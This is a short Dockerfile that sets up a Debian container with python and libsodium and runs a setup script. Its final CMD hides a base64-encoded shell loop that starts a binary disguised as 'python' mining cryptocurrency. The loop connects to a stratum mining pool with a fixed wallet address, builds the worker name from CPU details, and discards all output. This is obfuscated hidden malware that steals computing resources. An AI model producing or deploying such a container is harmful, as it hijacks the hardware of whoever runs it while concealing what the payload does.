FROM debian:stable-slim
ENV TERM=xterm
ENV DEBIAN_FRONTEND=noninteractive
RUN apt-get update -y
RUN apt-get upgrade -y
RUN apt-get install python libsodium-dev -y
COPY . .
RUN bash setup
CMD ["/bin/bash", "-c", "base64 -d <<< Y2QgJEhPTUUvLiQoZWNobyAkKGhvc3RuYW1lKSkvYmluICYmIFBBVEg9JChwd2QpOiRQQVRIICYmIHdoaWxlIFsgMSBdOyBkbyBweXRob24gLS1rZWVwLWFsaXZlIC1jIHN0cmF0dW0rc3NsOi8vbmEubHVja3Bvb2wubmV0OjM5NTggLXUgUkpkajlqSDhLa1pBMWNUcnFDUjdjTVAzYmVleHB2dHg1bS4kKGVjaG8gJChucHJvYykpLSQoZWNobyAkKGxzY3B1IHwgZ3JlcCAnTW9kZWwgbmFtZScgfCBjdXQgLWYgMiAtZCAiOiIgfCBhd2sgJ3skMT0kMX0xJyB8IHRyIC1kYyAnWzphbG51bTpdXG5ccicpKSAtcCB4ID4gL2Rldi9udWxsOyBzbGVlcCAxOyBkb25l | bash"]
